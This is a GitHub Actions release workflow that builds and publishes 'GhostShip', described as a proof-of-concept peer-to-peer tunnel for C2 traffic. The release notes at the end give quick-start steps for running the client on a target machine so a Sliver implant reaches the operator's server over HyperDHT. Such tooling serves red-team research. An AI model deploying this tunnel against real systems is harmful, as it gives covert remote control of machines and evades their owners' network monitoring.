name: GhostShip Release

on:
  push:
    branches:
      - main
    tags:
      - 'v*'
  pull_request:
    branches:
      - main

env:
  NODE_VERSION: "20.11.0"

jobs:
  build-bridge-linux:
    name: Build Bridge (Linux)
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Download Node.js Linux x64
        run: |
          curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz" -o node-linux.tar.xz
          tar -xf node-linux.tar.xz
          mv node-v${NODE_VERSION}-linux-x64/bin/node node-linux
          chmod +x node-linux

      - name: Install bridge dependencies
        working-directory: bridge/nodejs
        run: npm install --production

      - name: Create Linux bridge bundle
        run: |
          mkdir -p bridge-bundle-linux

          cp node-linux bridge-bundle-linux/
          cp bridge/nodejs/bridge.js bridge-bundle-linux/
          cp bridge/nodejs/package.json bridge-bundle-linux/
          cp -r bridge/nodejs/node_modules bridge-bundle-linux/

          cat > bridge-bundle-linux/ghostship-bridge << 'LAUNCHER'
          #!/bin/bash
          SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
          exec "$SCRIPT_DIR/node-linux" "$SCRIPT_DIR/bridge.js" "$@"
          LAUNCHER
          chmod +x bridge-bundle-linux/ghostship-bridge

          tar -czf bridge-linux.tar.gz -C bridge-bundle-linux .
          ls -lh bridge-linux.tar.gz

      - name: Upload Linux Bridge
        uses: actions/upload-artifact@v4
        with:
          name: bridge-linux
          path: bridge-linux.tar.gz

  build-bridge-windows:
    name: Build Bridge (Windows)
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Download Node.js Windows x64
        run: |
          curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-win-x64.zip" -o node-windows.zip
          unzip -q node-windows.zip
          mv node-v${NODE_VERSION}-win-x64/node.exe node-windows.exe

      - name: Install bridge dependencies
        working-directory: bridge/nodejs
        run: npm install --production

      - name: Create Windows bridge bundle
        run: |
          mkdir -p bridge-bundle-windows

          cp node-windows.exe bridge-bundle-windows/
          cp bridge/nodejs/bridge.js bridge-bundle-windows/
          cp bridge/nodejs/package.json bridge-bundle-windows/
          cp -r bridge/nodejs/node_modules bridge-bundle-windows/

          cat > bridge-bundle-windows/ghostship-bridge.bat << 'LAUNCHER'
          @echo off
          "%~dp0node-windows.exe" "%~dp0bridge.js" %*
          LAUNCHER

          cd bridge-bundle-windows
          zip -r ../bridge-windows.zip .
          cd ..
          ls -lh bridge-windows.zip

      - name: Upload Windows Bridge
        uses: actions/upload-artifact@v4
        with:
          name: bridge-windows
          path: bridge-windows.zip

  build-client-linux:
    name: Build Client (Linux)
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Download Node.js Linux x64
        run: |
          curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-linux-x64.tar.xz" -o node-linux.tar.xz
          tar -xf node-linux.tar.xz
          mv node-v${NODE_VERSION}-linux-x64/bin/node node-linux
          chmod +x node-linux

      - name: Install client dependencies
        working-directory: client
        run: npm install --production

      - name: Create Linux client bundle
        run: |
          mkdir -p client-bundle-linux

          cp node-linux client-bundle-linux/
          cp client/client.js client-bundle-linux/
          cp client/package.json client-bundle-linux/
          cp -r client/node_modules client-bundle-linux/

          cat > client-bundle-linux/ghostship-client << 'LAUNCHER'
          #!/bin/bash
          SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
          exec "$SCRIPT_DIR/node-linux" "$SCRIPT_DIR/client.js" "$@"
          LAUNCHER
          chmod +x client-bundle-linux/ghostship-client

          tar -czf client-linux.tar.gz -C client-bundle-linux .
          ls -lh client-linux.tar.gz

      - name: Upload Linux Client
        uses: actions/upload-artifact@v4
        with:
          name: client-linux
          path: client-linux.tar.gz

  build-client-windows:
    name: Build Client (Windows)
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Download Node.js Windows x64
        run: |
          curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-win-x64.zip" -o node-windows.zip
          unzip -q node-windows.zip
          mv node-v${NODE_VERSION}-win-x64/node.exe node-windows.exe

      - name: Install client dependencies
        working-directory: client
        run: npm install --production

      - name: Create Windows client bundle
        run: |
          mkdir -p client-bundle-windows

          cp node-windows.exe client-bundle-windows/
          cp client/client.js client-bundle-windows/
          cp client/package.json client-bundle-windows/
          cp -r client/node_modules client-bundle-windows/

          cat > client-bundle-windows/ghostship-client.bat << 'LAUNCHER'
          @echo off
          "%~dp0node-windows.exe" "%~dp0client.js" %*
          LAUNCHER

          cd client-bundle-windows
          zip -r ../client-windows.zip .
          cd ..
          ls -lh client-windows.zip

      - name: Upload Windows Client
        uses: actions/upload-artifact@v4
        with:
          name: client-windows
          path: client-windows.zip

  release:
    name: Create Release
    needs: [build-bridge-linux, build-bridge-windows, build-client-linux, build-client-windows]
    runs-on: ubuntu-latest
    if: startsWith(github.ref, 'refs/tags/')
    permissions:
      contents: write
    steps:
      - name: Download all artifacts
        uses: actions/download-artifact@v4
        with:
          path: artifacts

      - name: List artifacts
        run: find artifacts -type f -ls

      - name: Create Release
        uses: softprops/action-gh-release@v1
        with:
          files: |
            artifacts/bridge-linux/bridge-linux.tar.gz
            artifacts/bridge-windows/bridge-windows.zip
            artifacts/client-linux/client-linux.tar.gz
            artifacts/client-windows/client-windows.zip
          name: GhostShip ${{ github.ref_name }}
          body: |
            ## GhostShip ${{ github.ref_name }}

            P2P tunnel for C2 traffic using HyperDHT. This is a **Proof of Concept**.

            ### Downloads

            | File | Platform | Description |
            |------|----------|-------------|
            | `bridge-linux.tar.gz` | Linux x64 | Operator-side bridge |
            | `bridge-windows.zip` | Windows x64 | Operator-side bridge |
            | `client-linux.tar.gz` | Linux x64 | Target-side client |
            | `client-windows.zip` | Windows x64 | Target-side client |

            ### Quick Start

            **1. Operator Side (with Sliver C2):**
            ```bash
            # Terminal 1: Start Sliver
            sliver-server
            sliver > mtls --lport 8888

            # Terminal 2: Start GhostShip bridge
            tar -xzf bridge-linux.tar.gz
            ./ghostship-bridge --port 8888
            # Note the connection key: hs://abc123...
            ```

            **2. Target Side:**
            ```bash
            # Start GhostShip client
            tar -xzf client-linux.tar.gz
            ./ghostship-client --connect "hs://abc123..." --port 8888

            # Generate and run your Sliver implant configured to connect to 127.0.0.1:8888
            ```

            **3. Receive Session:**
            ```
            sliver > sessions
            ```

            ### How It Works

            ```
            [Target]                          [Operator]
            Sliver Implant                    Sliver Server
                 |                                 |
                 v                                 v
            127.0.0.1:8888                   127.0.0.1:8888
                 |                                 |
                 v                                 v
            GhostShip Client  <--P2P/DHT-->  GhostShip Bridge
            ```

            ### Disclaimer
            This is a Proof of Concept for educational and authorized security research only.
          draft: false
          prerelease: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
